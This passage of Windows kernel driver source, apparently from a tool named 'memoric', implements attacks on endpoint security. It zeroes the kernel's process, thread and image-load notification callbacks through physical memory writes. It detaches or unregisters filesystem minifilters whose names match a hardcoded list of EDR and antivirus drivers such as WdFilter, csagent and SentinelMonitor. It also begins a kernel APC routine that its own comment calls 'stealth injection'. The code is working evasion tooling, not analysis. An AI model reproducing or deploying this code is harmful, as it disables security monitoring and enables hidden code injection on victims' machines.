                    return target;
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) { }

    return NULL;
}

static void GetModuleNameForAddr(ULONG64 addr, char* outName, ULONG outSize)
{
    PRTL_PROCESS_MODULES modules = NULL;
    ULONG bufSize = 0;
    NTSTATUS st;
    ULONG i;

    outName[0] = 0;
    st = ZwQuerySystemInformation(11, NULL, 0, &bufSize);
    if (bufSize == 0) return;
    bufSize += 4096;
    modules = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
    if (!modules) return;

    st = ZwQuerySystemInformation(11, modules, bufSize, &bufSize);
    if (NT_SUCCESS(st)) {
        for (i = 0; i < modules->NumberOfModules; i++) {
            ULONG_PTR base = (ULONG_PTR)modules->Modules[i].ImageBase;
            ULONG size = modules->Modules[i].ImageSize;
            if (addr >= base && addr < base + size) {
                PCHAR name = (PCHAR)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
                ULONG len = (ULONG)strlen(name);
                if (len >= outSize) len = outSize - 1;
                RtlCopyMemory(outName, name, len);
                outName[len] = 0;
                break;
            }
        }
    }
    ExFreePoolWithTag(modules, MEMORIC_POOL_TAG);
}

static NTSTATUS HandleCallbackNuke(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_CALLBACK_NUKE_REQUEST reqCopy;
    PMEMORIC_CALLBACK_NUKE_RESPONSE resp;
    PVOID ntBase = NULL;
    ULONG ntSize = 0;

    if (inputLength < sizeof(MEMORIC_CALLBACK_NUKE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_CALLBACK_NUKE_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_CALLBACK_NUKE_REQUEST));
    resp = (PMEMORIC_CALLBACK_NUKE_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_CALLBACK_NUKE_RESPONSE));

    /* Find ntoskrnl base */
    {
        PRTL_PROCESS_MODULES modules = NULL;
        ULONG bufSize = 0;
        NTSTATUS st;
        ULONG i;

        st = ZwQuerySystemInformation(11, NULL, 0, &bufSize);
        if (bufSize == 0) goto done;
        bufSize += 4096;
        modules = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
        if (!modules) goto done;

        st = ZwQuerySystemInformation(11, modules, bufSize, &bufSize);
        if (NT_SUCCESS(st)) {
            for (i = 0; i < modules->NumberOfModules; i++) {
                PCHAR name = (PCHAR)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
                if (_stricmp(name, "ntoskrnl.exe") == 0) {
                    ntBase = modules->Modules[i].ImageBase;
                    ntSize = modules->Modules[i].ImageSize;
                    break;
                }
            }
        }
        ExFreePoolWithTag(modules, MEMORIC_POOL_TAG);
    }
    if (!ntBase) goto done;

    {
        const char* exportNames[] = {
            "PsSetCreateProcessNotifyRoutine",  /* PROCESS */
            "PsSetCreateThreadNotifyRoutine",   /* THREAD */
            "PsSetLoadImageNotifyRoutine",      /* IMAGE */
        };
        ULONG cbType = reqCopy.CallbackType;

        if (cbType > 2) {
            /* OBJECT and REGISTRY types handled differently */
            resp->Success = 0;
            goto done;
        }

        PVOID cbArray = FindCallbackArrayEx((PUCHAR)ntBase, ntSize, exportNames[cbType], NULL);
        if (!cbArray) {
            DbgPrint("[memoric] CbNuke: Could not find callback array for type %lu\n", cbType);
            goto done;
        }

        switch (reqCopy.Action) {
        case MEMORIC_CBNUKE_ENUM: {
            ULONG found = 0;
            ULONG i;
            __try {
                PULONG_PTR entries = (PULONG_PTR)cbArray;
                for (i = 0; i < 64 && found < 64; i++) {
                    ULONG_PTR entry = entries[i];
                    if (entry == 0) continue;

                    /* Strip low bits to get pointer to callback struct */
                    PULONG_PTR cbStruct = (PULONG_PTR)(entry & ~0xFULL);
                    if (!MmIsAddressValid(cbStruct)) continue;

                    /* Callback function is at offset +0x8 in the struct */
                    ULONG64 funcAddr = cbStruct[1];
                    if (funcAddr == 0) continue;

                    resp->Entries[found].Address = funcAddr;
                    resp->Entries[found].Type = cbType;
                    resp->Entries[found].Active = 1;

                    /* Find owning module */
                    GetModuleNameForAddr(funcAddr, resp->Entries[found].ModuleName, 64);

                    /* Get module base */
                    {
                        PRTL_PROCESS_MODULES mods = NULL;
                        ULONG bs = 0;
                        ZwQuerySystemInformation(11, NULL, 0, &bs);
                        if (bs) {
                            bs += 4096;
                            mods = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, bs, MEMORIC_POOL_TAG);
                            if (mods) {
                                if (NT_SUCCESS(ZwQuerySystemInformation(11, mods, bs, &bs))) {
                                    ULONG j;
                                    for (j = 0; j < mods->NumberOfModules; j++) {
                                        ULONG_PTR base = (ULONG_PTR)mods->Modules[j].ImageBase;
                                        if (funcAddr >= base && funcAddr < base + mods->Modules[j].ImageSize) {
                                            resp->Entries[found].ModuleBase = base;
                                            break;
                                        }
                                    }
                                }
                                ExFreePoolWithTag(mods, MEMORIC_POOL_TAG);
                            }
                        }
                    }
                    found++;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] CbNuke: Exception during enum\n");
            }
            resp->TotalCallbacks = found;
            resp->Success = 1;
            break;
        }

        case MEMORIC_CBNUKE_REMOVE: {
            __try {
                PULONG_PTR entries = (PULONG_PTR)cbArray;
                ULONG idx = reqCopy.Index;
                ULONG current = 0;
                ULONG i;

                for (i = 0; i < 64; i++) {
                    if (entries[i] == 0) continue;
                    if (current == idx) {
                        /* Save for restore */
                        LONG saveIdx;
                        for (saveIdx = 0; saveIdx < MAX_SAVED_CALLBACKS; saveIdx++) {
                            if (!g_SavedCallbacks[saveIdx].InUse) {
                                PULONG_PTR cbStruct = (PULONG_PTR)(entries[i] & ~0xFULL);
                                g_SavedCallbacks[saveIdx].InUse = TRUE;
                                g_SavedCallbacks[saveIdx].Type = cbType;
                                g_SavedCallbacks[saveIdx].OrigAddr = entries[i];
                                g_SavedCallbacks[saveIdx].ArrayIndex = i;
                                InterlockedIncrement(&g_SavedCallbackCount);
                                break;
                            }
                        }

                        /* Zero the entry using physical memory write */
                        PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(&entries[i]);
                        if (pa.QuadPart) {
                            PVOID mapped = MmMapIoSpace(pa, 8, MmNonCached);
                            if (mapped) {
                                *(PULONG_PTR)mapped = 0;
                                MmUnmapIoSpace(mapped, 8);
                                resp->RemovedCount = 1;
                                resp->Success = 1;
                                DbgPrint("[memoric] CbNuke: Removed callback at index %lu (array slot %lu)\n", idx, i);
                            }
                        }
                        break;
                    }
                    current++;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] CbNuke: Exception during remove\n");
            }
            break;
        }

        case MEMORIC_CBNUKE_NUKE_ALL: {
            __try {
                PULONG_PTR entries = (PULONG_PTR)cbArray;
                ULONG removed = 0;
                ULONG i;

                for (i = 0; i < 64; i++) {
                    ULONG_PTR entry = entries[i];
                    if (entry == 0) continue;

                    PULONG_PTR cbStruct = (PULONG_PTR)(entry & ~0xFULL);
                    if (!MmIsAddressValid(cbStruct)) continue;

                    ULONG64 funcAddr = cbStruct[1];
                    char modName[64] = {0};
                    GetModuleNameForAddr(funcAddr, modName, 64);

                    /* Skip ntoskrnl callbacks (OS built-in) */
                    if (_stricmp(modName, "ntoskrnl.exe") == 0) continue;

                    /* Save for restore */
                    LONG saveIdx;
                    for (saveIdx = 0; saveIdx < MAX_SAVED_CALLBACKS; saveIdx++) {
                        if (!g_SavedCallbacks[saveIdx].InUse) {
                            g_SavedCallbacks[saveIdx].InUse = TRUE;
                            g_SavedCallbacks[saveIdx].Type = cbType;
                            g_SavedCallbacks[saveIdx].OrigAddr = entry;
                            g_SavedCallbacks[saveIdx].ArrayIndex = i;
                            InterlockedIncrement(&g_SavedCallbackCount);
                            break;
                        }
                    }

                    /* Zero via physical memory */
                    PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(&entries[i]);
                    if (pa.QuadPart) {
                        PVOID mapped = MmMapIoSpace(pa, 8, MmNonCached);
                        if (mapped) {
                            *(PULONG_PTR)mapped = 0;
                            MmUnmapIoSpace(mapped, 8);
                            removed++;
                            DbgPrint("[memoric] CbNuke: Nuked callback from %s at slot %lu\n", modName, i);
                        }
                    }
                }
                resp->RemovedCount = removed;
                resp->Success = (removed > 0) ? 1 : 0;
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrint("[memoric] CbNuke: Exception during nuke_all\n");
            }
            break;
        }

        case MEMORIC_CBNUKE_RESTORE: {
            __try {
                PULONG_PTR entries = (PULONG_PTR)cbArray;
                ULONG restored = 0;
                LONG si;

                for (si = 0; si < MAX_SAVED_CALLBACKS; si++) {
                    if (!g_SavedCallbacks[si].InUse) continue;
                    if (g_SavedCallbacks[si].Type != cbType) continue;

                    ULONG arrayIdx = g_SavedCallbacks[si].ArrayIndex;
                    PHYSICAL_ADDRESS pa = MmGetPhysicalAddress(&entries[arrayIdx]);
                    if (pa.QuadPart) {
                        PVOID mapped = MmMapIoSpace(pa, 8, MmNonCached);
                        if (mapped) {
                            *(PULONG_PTR)mapped = (ULONG_PTR)g_SavedCallbacks[si].OrigAddr;
                            MmUnmapIoSpace(mapped, 8);
                            g_SavedCallbacks[si].InUse = FALSE;
                            InterlockedDecrement(&g_SavedCallbackCount);
                            restored++;
                        }
                    }
                }
                resp->RemovedCount = restored;
                resp->Success = (restored > 0) ? 1 : 0;
                DbgPrint("[memoric] CbNuke: Restored %lu callbacks (type %lu)\n", restored, cbType);
            } __except (EXCEPTION_EXECUTE_HANDLER) { }
            break;
        }
        }
    }

done:
    *bytesReturned = sizeof(MEMORIC_CALLBACK_NUKE_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * Minifilter Detach — Enumerate and detach filesystem minifilters
 * Walks FltGlobals->FrameList to find filter instances.
 * ---------------------------------------------------------------- */

static NTSTATUS HandleMinifilterDetach(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_MINIFILTER_REQUEST reqCopy;
    PMEMORIC_MINIFILTER_DETACH_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_MINIFILTER_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_MINIFILTER_DETACH_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_MINIFILTER_REQUEST));
    resp = (PMEMORIC_MINIFILTER_DETACH_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_MINIFILTER_DETACH_RESPONSE));

    /*
     * Dynamically import Filter Manager functions.
     * FltEnumerateFilters / FltGetFilterInformation / FltObjectDereference
     * are used for proper enumeration; FltUnregisterFilter for detach.
     */
    typedef NTSTATUS (NTAPI *PFN_FltEnumerateFilters)(
        PVOID *FilterList, ULONG FilterListSize, PULONG NumberFiltersReturned);
    typedef NTSTATUS (NTAPI *PFN_FltGetFilterInformation)(
        PVOID Filter, ULONG InformationClass, PVOID Buffer,
        ULONG BufferSize, PULONG BytesReturned);
    typedef VOID (NTAPI *PFN_FltObjectDereference)(PVOID FltObject);
    typedef NTSTATUS (NTAPI *PFN_FltUnregisterFilter)(PVOID Filter);
    typedef NTSTATUS (NTAPI *PFN_FltEnumerateInstances)(
        PVOID Volume, PVOID Filter, PVOID *InstanceList,
        ULONG InstanceListSize, PULONG NumberInstancesReturned);
    typedef NTSTATUS (NTAPI *PFN_FltDetachVolume)(
        PVOID Filter, PVOID Volume, PCUNICODE_STRING InstanceName);
    typedef NTSTATUS (NTAPI *PFN_FltEnumerateVolumes)(
        PVOID Filter, PVOID *VolumeList, ULONG VolumeListSize,
        PULONG NumberVolumesReturned);

    typedef struct _FILTER_FULL_INFO_D {
        ULONG  NextEntryOffset;
        ULONG  FrameID;
        ULONG  NumberOfInstances;
        USHORT FilterNameLength;
        WCHAR  FilterNameBuffer[1];
    } FILTER_FULL_INFO_D;

    {
        UNICODE_STRING fn1, fn2, fn3, fn4, fn5, fn6, fn7;
        PFN_FltEnumerateFilters      pFltEnum;
        PFN_FltGetFilterInformation  pFltGetInfo;
        PFN_FltObjectDereference     pFltDeref;
        PFN_FltUnregisterFilter      pFltUnreg;
        PFN_FltEnumerateInstances    pFltEnumInst;
        PFN_FltDetachVolume          pFltDetach;
        PFN_FltEnumerateVolumes      pFltEnumVols;

        RtlInitUnicodeString(&fn1, L"FltEnumerateFilters");
        RtlInitUnicodeString(&fn2, L"FltGetFilterInformation");
        RtlInitUnicodeString(&fn3, L"FltObjectDereference");
        RtlInitUnicodeString(&fn4, L"FltUnregisterFilter");
        RtlInitUnicodeString(&fn5, L"FltEnumerateInstances");
        RtlInitUnicodeString(&fn6, L"FltDetachVolume");
        RtlInitUnicodeString(&fn7, L"FltEnumerateVolumes");

        pFltEnum      = (PFN_FltEnumerateFilters)MmGetSystemRoutineAddress(&fn1);
        pFltGetInfo   = (PFN_FltGetFilterInformation)MmGetSystemRoutineAddress(&fn2);
        pFltDeref     = (PFN_FltObjectDereference)MmGetSystemRoutineAddress(&fn3);
        pFltUnreg     = (PFN_FltUnregisterFilter)MmGetSystemRoutineAddress(&fn4);
        pFltEnumInst  = (PFN_FltEnumerateInstances)MmGetSystemRoutineAddress(&fn5);
        pFltDetach    = (PFN_FltDetachVolume)MmGetSystemRoutineAddress(&fn6);
        pFltEnumVols  = (PFN_FltEnumerateVolumes)MmGetSystemRoutineAddress(&fn7);

        if (!pFltEnum || !pFltDeref) {
            DbgPrint("[memoric] MinifilterDetach: FltEnumerateFilters/FltObjectDereference not available\n");
            resp->Success = 0;
        } else {

        switch (reqCopy.Action) {
        case MEMORIC_MINIFILTER_ENUM: {
            /*
             * Enumerate all registered minifilters via FltEnumerateFilters.
             * For each filter, get its name/frame/instances via FltGetFilterInformation.
             */
            PVOID *filterList = NULL;
            ULONG numFilters = 0, found = 0;
            NTSTATUS st;

            st = pFltEnum(NULL, 0, &numFilters);
            if (numFilters == 0) { resp->Success = 1; break; }

            filterList = (PVOID *)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                numFilters * sizeof(PVOID), MEMORIC_POOL_TAG);
            if (!filterList) break;

            {
                ULONG actualCount = 0;
                st = pFltEnum(filterList, numFilters, &actualCount);
                if (NT_SUCCESS(st)) {
                    ULONG fi;
                    UCHAR infoBuf[512];
                    for (fi = 0; fi < actualCount && found < 32; fi++) {
                        if (pFltGetInfo) {
                            ULONG retBytes = 0;
                            st = pFltGetInfo(filterList[fi], 0 /* FilterFullInformation */,
                                             infoBuf, sizeof(infoBuf), &retBytes);
                            if (NT_SUCCESS(st) && retBytes >= sizeof(FILTER_FULL_INFO_D)) {
                                FILTER_FULL_INFO_D *info = (FILTER_FULL_INFO_D *)infoBuf;
                                ULONG copyLen = info->FilterNameLength;
                                if (copyLen > 126) copyLen = 126;
                                RtlCopyMemory(resp->Entries[found].FilterName,
                                              info->FilterNameBuffer, copyLen);
                                resp->Entries[found].FilterName[copyLen / sizeof(WCHAR)] = L'\0';
                                resp->Entries[found].FrameId = info->FrameID;
                                resp->Entries[found].NumInstances = info->NumberOfInstances;
                                resp->Entries[found].FilterAddr = (ULONG64)(ULONG_PTR)filterList[fi];
                                found++;
                            }
                        } else {
                            resp->Entries[found].FilterAddr = (ULONG64)(ULONG_PTR)filterList[fi];
                            found++;
                        }
                        pFltDeref(filterList[fi]);
                    }
                    for (; fi < actualCount; fi++)
                        pFltDeref(filterList[fi]);
                }
            }
            ExFreePoolWithTag(filterList, MEMORIC_POOL_TAG);
            resp->TotalFilters = found;
            resp->Success = 1;
            DbgPrint("[memoric] MinifilterDetach ENUM: found %lu filters via FltMgr\n", found);
            break;
        }

        case MEMORIC_MINIFILTER_DETACH:
        case MEMORIC_MINIFILTER_NUKE: {
            /*
             * DETACH mode (official API path):
             *   FltEnumerateInstances(Filter) → FltDetachVolume(Filter, Volume)
             *   for each instance's volume. This detaches the filter's instances
             *   from all volumes, stopping callback invocation without unloading
             *   the driver. This is the most stable approach: all APIs are
             *   documented and publicly available.
             *
             * NUKE mode (detach-first, FltUnregisterFilter-second):
             *   First tries the official DETACH path — FltEnumerateInstances +
             *   FltDetachVolume for each volume. If all instances are detached,
             *   the filter is neutralised without contract violation.
             *   Only if instances remain does it escalate to FltUnregisterFilter,
             *   minimising the contract boundary violation.
             *
             * Steps:
             * 1. Enumerate all filters via FltEnumerateFilters
             * 2. Get each filter's name via FltGetFilterInformation
             * 3. Match against target name (DETACH) or EDR/AV list (NUKE)
             * 4. DETACH: enumerate instances, detach each from its volume
             *    NUKE: FltUnregisterFilter
             */
            PVOID *filterList = NULL;
            ULONG numFilters = 0;
            ULONG detached = 0;
            NTSTATUS st;

            if (reqCopy.Action == MEMORIC_MINIFILTER_NUKE && !pFltUnreg && (!pFltEnumInst || !pFltDetach)) {
                DbgPrint("[memoric] MinifilterDetach: Neither FltUnregisterFilter nor FltDetachVolume available for NUKE\n");
                resp->Success = 0;
                break;
            }

            if (reqCopy.Action == MEMORIC_MINIFILTER_DETACH && (!pFltEnumInst || !pFltDetach)) {
                DbgPrint("[memoric] MinifilterDetach: FltEnumerateInstances/FltDetachVolume not available\n");
                resp->Success = 0;
                break;
            }

            st = pFltEnum(NULL, 0, &numFilters);
            if (numFilters == 0) { resp->Success = 1; break; }

            filterList = (PVOID *)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                numFilters * sizeof(PVOID), MEMORIC_POOL_TAG);
            if (!filterList) break;

            {
                ULONG actualCount = 0;
                st = pFltEnum(filterList, numFilters, &actualCount);
                if (NT_SUCCESS(st) && pFltGetInfo) {
                    ULONG fi;
                    for (fi = 0; fi < actualCount; fi++) {
                        UCHAR infoBuf[512];
                        ULONG retBytes = 0;
                        BOOLEAN shouldProcess = FALSE;

                        st = pFltGetInfo(filterList[fi], 0, infoBuf, sizeof(infoBuf), &retBytes);
                        if (!NT_SUCCESS(st) || retBytes < sizeof(FILTER_FULL_INFO_D)) {
                            pFltDeref(filterList[fi]);
                            continue;
                        }

                        {
                            FILTER_FULL_INFO_D *info = (FILTER_FULL_INFO_D *)infoBuf;
                            WCHAR nameW[64] = {0};
                            ULONG copyLen = info->FilterNameLength;
                            if (copyLen > 126) copyLen = 126;
                            RtlCopyMemory(nameW, info->FilterNameBuffer, copyLen);
                            nameW[copyLen / sizeof(WCHAR)] = L'\0';

                            if (reqCopy.Action == MEMORIC_MINIFILTER_NUKE) {
                                /* Known EDR/AV minifilter names */
                                static const WCHAR* edrFilters[] = {
                                    L"WdFilter", L"csagent", L"SentinelMonitor",
                                    L"cbdisk", L"klif", L"eamonm", L"hmpalert",
                                    L"CyProtectDrv", L"mfehidk", L"mfefirek",
                                    L"srtsp", L"SymEFASI", L"avgSnx",
                                    L"epfw", L"bdsandbox", L"aswSP",
                                    L"TmXPFlt", L"TmFileEncDmk",
                                    NULL
                                };
                                ULONG j;
                                for (j = 0; edrFilters[j]; j++) {
                                    if (wcsstr(nameW, edrFilters[j]) != NULL) {
                                        shouldProcess = TRUE;
                                        break;
                                    }
                                }
                            } else {
                                if (_wcsicmp(nameW, reqCopy.FilterName) == 0)
                                    shouldProcess = TRUE;
                            }

                            if (shouldProcess) {
                                if (reqCopy.Action == MEMORIC_MINIFILTER_DETACH) {
                                    /*
                                     * Official API path: enumerate all instances of this filter
                                     * and detach each one from its volume via FltDetachVolume.
                                     *
                                     * FltEnumerateInstances(NULL, Filter, ...) returns all
                                     * instances for this filter across all volumes.
                                     * FltDetachVolume(Filter, Volume, NULL) detaches the
                                     * highest matching instance from each volume.
                                     *
                                     * Both APIs are documented and officially supported.
                                     */
                                    PVOID *instList = NULL;
                                    ULONG numInst = 0;
                                    ULONG instDetached = 0;

                                    st = pFltEnumInst(NULL, filterList[fi], NULL, 0, &numInst);
                                    if (numInst > 0) {
                                        instList = (PVOID *)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                                            numInst * sizeof(PVOID), MEMORIC_POOL_TAG);
                                        if (instList) {
                                            ULONG actualInst = 0;
                                            st = pFltEnumInst(NULL, filterList[fi],
                                                instList, numInst, &actualInst);
                                            if (NT_SUCCESS(st)) {
                                                /*
                                                 * For each instance, we need its volume.
                                                 * FltEnumerateVolumes enumerates all volumes;
                                                 * we detach the filter from each volume directly.
                                                 */
                                                if (pFltEnumVols) {
                                                    PVOID *volList = NULL;
                                                    ULONG numVols = 0;
                                                    st = pFltEnumVols(filterList[fi], NULL, 0, &numVols);
                                                    if (numVols > 0) {
                                                        volList = (PVOID *)ExAllocatePool2(
                                                            POOL_FLAG_NON_PAGED,
                                                            numVols * sizeof(PVOID), MEMORIC_POOL_TAG);
                                                        if (volList) {
                                                            ULONG actualVols = 0;
                                                            st = pFltEnumVols(filterList[fi],
                                                                volList, numVols, &actualVols);
                                                            if (NT_SUCCESS(st)) {
                                                                ULONG vi;
                                                                for (vi = 0; vi < actualVols; vi++) {
                                                                    st = pFltDetach(filterList[fi],
                                                                        volList[vi], NULL);
                                                                    if (NT_SUCCESS(st))
                                                                        instDetached++;
                                                                    pFltDeref(volList[vi]);
                                                                }
                                                            } else {
                                                                ULONG vi;
                                                                for (vi = 0; vi < actualVols; vi++)
                                                                    pFltDeref(volList[vi]);
                                                            }
                                                            ExFreePoolWithTag(volList, MEMORIC_POOL_TAG);
                                                        }
                                                    }
                                                }
                                                {
                                                    ULONG ii;
                                                    for (ii = 0; ii < actualInst; ii++)
                                                        pFltDeref(instList[ii]);
                                                }
                                            }
                                            ExFreePoolWithTag(instList, MEMORIC_POOL_TAG);
                                        }
                                    }

                                    if (instDetached > 0) {
                                        if (detached < 32) {
                                            RtlCopyMemory(resp->Entries[detached].FilterName, nameW, 128);
                                            resp->Entries[detached].FrameId = info->FrameID;
                                            resp->Entries[detached].NumInstances = info->NumberOfInstances;
                                            resp->Entries[detached].FilterAddr = (ULONG64)(ULONG_PTR)filterList[fi];
                                        }
                                        detached++;
                                        DbgPrint("[memoric] MinifilterDetach: Detached %lu instances of '%ls' via FltDetachVolume\n",
                                                 instDetached, nameW);
                                    }
                                }
                                else /* NUKE */ {
                                    /*
                                     * NUKE: detach-first, FltUnregisterFilter-second.
                                     *
                                     * Step 1: Try the official DETACH path first — enumerate
                                     * all instances and detach from every volume. This is the
                                     * documented, stable approach and handles most cases.
                                     *
                                     * Step 2: Only if instances remain after detaching (or if
                                     * FltEnumerateInstances/FltDetachVolume are unavailable),
                                     * escalate to FltUnregisterFilter as last resort.
                                     *
                                     * This minimises the contract violation: FltUnregisterFilter
                                     * is only called when gentler methods have already failed.
                                     */
                                    BOOLEAN nukeNeeded = TRUE;

                                    /* Step 1: attempt detach-all via official APIs */
                                    if (pFltEnumInst && pFltDetach && pFltEnumVols) {
                                        ULONG numInst2 = 0;
                                        ULONG nukeDet = 0;
                                        st = pFltEnumInst(NULL, filterList[fi], NULL, 0, &numInst2);
                                        if (numInst2 > 0 && pFltEnumVols) {
                                            PVOID *volList2 = NULL;
                                            ULONG numVols2 = 0;
                                            st = pFltEnumVols(filterList[fi], NULL, 0, &numVols2);
                                            if (numVols2 > 0) {
                                                volList2 = (PVOID *)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                                                    numVols2 * sizeof(PVOID), MEMORIC_POOL_TAG);
                                                if (volList2) {
                                                    ULONG actualVols2 = 0;
                                                    st = pFltEnumVols(filterList[fi],
                                                        volList2, numVols2, &actualVols2);
                                                    if (NT_SUCCESS(st)) {
                                                        ULONG vi2;
                                                        for (vi2 = 0; vi2 < actualVols2; vi2++) {
                                                            st = pFltDetach(filterList[fi],
                                                                volList2[vi2], NULL);
                                                            if (NT_SUCCESS(st))
                                                                nukeDet++;
                                                            pFltDeref(volList2[vi2]);
                                                        }
                                                    } else {
                                                        ULONG vi2;
                                                        for (vi2 = 0; vi2 < actualVols2; vi2++)
                                                            pFltDeref(volList2[vi2]);
                                                    }
                                                    ExFreePoolWithTag(volList2, MEMORIC_POOL_TAG);
                                                }
                                            }
                                            if (nukeDet > 0) {
                                                DbgPrint("[memoric] MinifilterDetach NUKE: Pre-detached %lu volumes for '%ls'\n",
                                                         nukeDet, nameW);
                                            }
                                            /* Check if instances remain after detach */
                                            numInst2 = 0;
                                            st = pFltEnumInst(NULL, filterList[fi], NULL, 0, &numInst2);
                                            if (numInst2 == 0) {
                                                /* All instances detached — no need for FltUnregisterFilter */
                                                nukeNeeded = FALSE;
                                                if (detached < 32) {
                                                    RtlCopyMemory(resp->Entries[detached].FilterName, nameW, 128);
                                                    resp->Entries[detached].FrameId = info->FrameID;
                                                    resp->Entries[detached].NumInstances = info->NumberOfInstances;
                                                    resp->Entries[detached].FilterAddr = (ULONG64)(ULONG_PTR)filterList[fi];
                                                }
                                                detached++;
                                                DbgPrint("[memoric] MinifilterDetach NUKE: '%ls' fully detached without FltUnregisterFilter\n",
                                                         nameW);
                                            }
                                        }
                                    }

                                    /* Step 2: escalate to FltUnregisterFilter only if instances remain */
                                    if (nukeNeeded) {
                                        __try {
                                            pFltUnreg(filterList[fi]);
                                            if (detached < 32) {
                                                RtlCopyMemory(resp->Entries[detached].FilterName, nameW, 128);
                                                resp->Entries[detached].FrameId = info->FrameID;
                                                resp->Entries[detached].NumInstances = info->NumberOfInstances;
                                                resp->Entries[detached].FilterAddr = (ULONG64)(ULONG_PTR)filterList[fi];
                                            }
                                            detached++;
                                            DbgPrint("[memoric] MinifilterDetach NUKE: FltUnregisterFilter('%ls') after partial detach\n", nameW);
                                        } __except (EXCEPTION_EXECUTE_HANDLER) {
                                            DbgPrint("[memoric] MinifilterDetach NUKE: FltUnregisterFilter('%ls') exception: 0x%08X\n",
                                                     nameW, GetExceptionCode());
                                        }
                                    }
                                }
                            }
                        }
                        pFltDeref(filterList[fi]);
                    }
                } else {
                    ULONG fi;
                    for (fi = 0; fi < actualCount; fi++)
                        pFltDeref(filterList[fi]);
                }
            }
            ExFreePoolWithTag(filterList, MEMORIC_POOL_TAG);
            resp->DetachedCount = detached;
            resp->TotalFilters = numFilters;
            resp->Success = (detached > 0) ? 1 : 0;
            break;
        }
        }
        } /* end else (pFltEnum && pFltDeref) */
    }

    *bytesReturned = sizeof(MEMORIC_MINIFILTER_DETACH_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * Kernel APC Inject — Queue user-mode APC from kernel for stealth
 * injection. Uses KeInitializeApc + KeInsertQueueApc.
 * ---------------------------------------------------------------- */

static VOID KernelApcKernelRoutine(
    PKAPC Apc,
    PKNORMAL_ROUTINE* NormalRoutine,
    PVOID* NormalContext,
    PVOID* SystemArgument1,
    PVOID* SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    /* Free the APC object after it fires */
    ExFreePoolWithTag(Apc, MEMORIC_POOL_TAG);
}

static VOID KernelApcRundownRoutine(PKAPC Apc)
{
    /* Thread is being terminated, free APC */
    ExFreePoolWithTag(Apc, MEMORIC_POOL_TAG);
}

static NTSTATUS HandleKernelApcInject(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_KERNEL_APC_REQUEST reqCopy;
    PMEMORIC_KERNEL_APC_RESPONSE resp;
    PEPROCESS process = NULL;
    PETHREAD thread = NULL;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_KERNEL_APC_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_KERNEL_APC_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_KERNEL_APC_REQUEST));
    resp = (PMEMORIC_KERNEL_APC_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_KERNEL_APC_RESPONSE));

    st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
    if (!NT_SUCCESS(st)) {
        resp->NtStatus = (ULONG64)st;
        *bytesReturned = sizeof(MEMORIC_KERNEL_APC_RESPONSE);
        return STATUS_SUCCESS;
    }

    if (reqCopy.ThreadId != 0) {
        /* Use specific thread */
        st = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)reqCopy.ThreadId, &thread);
        if (!NT_SUCCESS(st)) {
            ObDereferenceObject(process);
            resp->NtStatus = (ULONG64)st;
            *bytesReturned = sizeof(MEMORIC_KERNEL_APC_RESPONSE);
            return STATUS_SUCCESS;
        }
    } else {
        /*
         * Find best thread for APC injection in target process.
         * Priority: 1) Waiting thread (ThreadState==5) with alertable WaitReason
         *              (DelayExecution=4, UserRequest=6, WrQueue=15)
         *           2) Any waiting thread
         *           3) First non-terminated thread as fallback
         *
         * Skip terminated threads (state==4) and real-time priority
         * threads (priority >= 16, likely system workers).
         */
        PSYSTEM_PROCESS_INFO_APC procInfo = NULL;
        ULONG bufSize = 0;

        st = ZwQuerySystemInformation(5 /* SystemProcessInformation */, NULL, 0, &bufSize);
        if (bufSize > 0) {
            bufSize += 4096;
            procInfo = (PSYSTEM_PROCESS_INFO_APC)ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
            if (procInfo) {
                st = ZwQuerySystemInformation(5, procInfo, bufSize, &bufSize);
